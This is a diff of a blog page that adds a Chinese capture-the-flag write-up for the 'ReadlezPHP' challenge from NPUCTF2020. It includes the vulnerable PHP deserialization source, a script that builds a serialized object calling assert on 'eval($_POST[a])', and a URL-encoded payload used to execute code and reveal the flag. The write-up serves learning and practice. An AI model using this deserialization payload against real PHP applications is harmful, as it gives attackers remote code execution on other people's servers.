@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>Kath4rs1s | Kath4rs1s</title>
+  <title>BUUCTF[NPUCTF2020]web 部分WP | Kath4rs1s</title>
 
   
     <link rel="apple-touch-icon" href="/images/favicon.ico">
@@ -88,7 +88,7 @@
 <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
 <div class="container post-details" id="post-details">
   <div class="post-content">
-    <div class="post-title">Kath4rs1s</div>
+    <div class="post-title">BUUCTF[NPUCTF2020]web 部分WP</div>
     <div class="post-attach">
       <span class="post-pubtime">2020-05-28</span>
       <span class="post-tags">
@@ -96,7 +96,36 @@
       </span>
     </div>
     <div class="markdown-body">
-      <p>###hello my friends</p>
+      <p>[TOC]</p>
+<h1 id="BUUCTF-NPUCTF2020-web-部分WP"><a href="#BUUCTF-NPUCTF2020-web-部分WP" class="headerlink" title="BUUCTF[NPUCTF2020] web 部分WP"></a>BUUCTF[NPUCTF2020] web 部分WP</h1><p>上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up</p>
+<h2 id="ReadlezPHP"><a href="#ReadlezPHP" class="headerlink" title="ReadlezPHP"></a>ReadlezPHP</h2><p>这是一道简单的反序列化的题<br>进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签</p>
+<p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423190116592-758599765.png" alt=""></p>
+<p>然后进入页面，看到了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>
+<p>这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行<em>echo $b($a)</em>，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。<br>接下来便是写php脚本构造序列化了，期间试了很多函数比如<em>system</em>等等都被禁用了，但是我们还可以用<strong>assert</strong>这个函数。<br>首先我们来了解一下断言（assert）这个函数，参考大佬的文章<a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074" target="_blank" rel="noopener">PHP assert 和 eval</a></p>
+<blockquote>
+<p>assert   判断一个表达式是否成立。返回true or false；</p>
+</blockquote>
+<p>我们来看一个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;123&quot;;</span><br><span class="line">echo assert(is_numeric($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这段代码输出的结果是：<br><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423195608051-314750544.png" alt=""></p>
+<p>简言之就是<em>assert()</em>可以将整个字符串参数当作php参数执行，而类似的<em>eval()</em>函数是执行合法的php代码。<br>接下来放出序列化的脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line">$c-&gt;b &#x3D; &#39;assert&#39;;</span><br><span class="line">$c-&gt;a &#x3D; &#39;eval($_POST[a]);&#39;;</span><br><span class="line">echo urlencode(serialize($c)).&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里除了用<em>assert()</em>之外，还可以用<strong>call_user_func()</strong>函数</p>
+<blockquote>
+<p>call_user_func — 把第一个参数作为回调函数调用</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function barber($type)&#123;</span><br><span class="line">    echo &quot;you wanted a $type haircut, no problem\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(&#39;barber&#39;,&#39;mushroom&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;返回内容如下：</span><br><span class="line">&#x2F;&#x2F;you wanted a mushroom haircut, no problem</span><br></pre></td></tr></table></figure>
+<p>只要构造出<strong>call_user_func(phpinfo)</strong>就好了</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data&#x3D;O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>成功得出结果：</p>
+<p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200124220-346066862.png" alt=""></p>
+<p>flag就在phpinfo中</p>
+<p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200413520-1487498985.png" alt=""><br>得到flag！</p>
+<p><strong>未完待续···</strong></p>
 
     </div>
     
@@ -122,6 +151,16 @@
     
   </div>
   
+  <div class="post-catalog" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-NPUCTF2020-web-部分WP"><span class="toc-text">BUUCTF[NPUCTF2020] web 部分WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ReadlezPHP"><span class="toc-text">ReadlezPHP</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  <script src="/js/catalog.js"></script>
+
+
 
   
     <div class="comments-container">
